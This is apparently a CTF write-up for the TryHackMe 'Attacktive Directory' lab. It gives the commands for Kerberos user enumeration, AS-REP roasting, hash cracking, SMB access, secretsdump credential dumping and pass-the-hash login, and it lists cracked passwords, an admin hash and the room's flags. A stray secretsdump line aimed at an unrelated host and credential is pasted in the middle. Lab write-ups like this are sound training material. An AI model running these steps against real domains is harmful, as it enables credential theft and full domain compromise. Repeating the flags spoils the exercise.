# Attactive Directory

## nmap
```
nmap -T4 -sV -sC -oN nmap/scan 10.10.147.54
Nmap scan report for 10.10.147.54
Host is up (0.21s latency).
Not shown: 991 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-11-08 12:34:47Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2021-11-08T12:34:56+00:00
|_ssl-date: 2021-11-08T12:35:05+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2021-11-07T12:34:21
|_Not valid after:  2022-05-09T12:34:21
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2021-11-08T12:34:57
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

```

## Kerberos Enumeration - Kerbrute

`./kerbrute_linux_amd64 userenum --dc spookysec.local -d spookysec.local ~/tryhackme/Attactive_Directory/usernames.txt`

Usernames Link: https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt


![](https://i.imgur.com/VdLkbeG.png)



## ASREPRoasting

- ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the account **does not** need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

### Look for users that are ASREPRoastable

`sudo python3 /opt/impacket/examples/GetNPUsers.py spookysec.local/ -usersfile validusers.txt -no-pass -dc-ip 10.10.147.54`

![](https://i.imgur.com/FUm4bJW.png)

### Crack hash of svc-admin

`hashcat -m 18200 hash.txt rockyou.txt`

- svc-admin:management2005


## Enumerate SMB

- `smbclient -L //10.10.147.54/ --user=svc-admin%management2005`
![](https://i.imgur.com/WHZbO5c.png)
sudo python3 secretsdump.py vulnnet-rst/a-whitehat:bNdKVkjv3RR9ht@10.10.117.161opt/
- Login to backup:
	- `smbclient //10.10.147.54/backup --user=svc-admin%management2005`

- Get credentials.txt and decode:
	- backup@spookysec.local:backup2517860

## secretsdump.py

- `sudo python3 /opt/impacket/examples/secretsdump.py spookysec/backup:backup2517860@10.10.147.54`

![](https://i.imgur.com/mGFgvnp.png)

## Crack Admin Hash

- Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::

### Login to admin account:

- `evil-winrm -u 'administrator' -H '0e0363213e37b94221497260b0bcb4fc' -i 10.10.147.54`
- cat /Desktop/root.txt
	- TryHackMe{4ctiveD1rectoryM4st3r}

- cd to users
- cd to svc-admin/Desktop
- cat user.txt.txt
	- TryHackMe{K3rb3r0s_Pr3_4uth}
- cd to backup/Desktop
- cat PrivEsc.txt
	- TryHackMe{B4ckM3UpSc0tty!}




